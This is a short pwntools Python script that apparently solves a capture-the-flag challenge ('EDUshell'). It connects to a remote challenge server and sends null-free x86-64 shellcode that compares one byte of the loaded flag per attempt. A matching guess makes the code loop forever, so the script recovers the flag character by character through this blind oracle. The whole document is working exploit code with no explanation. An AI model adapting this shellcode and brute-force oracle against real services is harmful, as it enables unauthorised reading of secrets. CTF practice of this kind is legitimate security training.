#!/usr/bin/env python3
from pwn import *
from time import sleep
import string
context.arch = 'amd64'
context.terminal = ['tmux', 'neww']

ch = '{}_ ' + string.digits + string.ascii_letters + string.punctuation + string.whitespace

flag = 'FLAG{5ee_thr0ugh_th3_b1ind3d_3y3'
l = len(flag)
idx = 0
i = 0
while True:
    c = ch[i]
    print('flag:', flag, 'now:', c, 'idx:', idx)
    #r = process('./EDUshell')
    r = remote('eofqual.zoolab.org', 10101)
    r.sendlineafter('$ ', 'loadflag')

    sc = asm('''
        pop rdi
        add di, {}
        xor eax, eax
        mov al, {}
        xor al, 0xff
        cmp byte ptr [rdi], al
    A:  je A
    '''.format(0x40e0-0x14c9+idx+l, ord(c)^0xff))
    assert(not any(cc in sc for cc in b'\0\r\n\t'))
    try:
        r.sendline(b'exec ' + sc + b'aaaa')
        r.recvuntil('GGGGGG',timeout=10)
        flag += c
        idx += 1
        i = 0
    except EOFError:
        i += 1

    r.close()
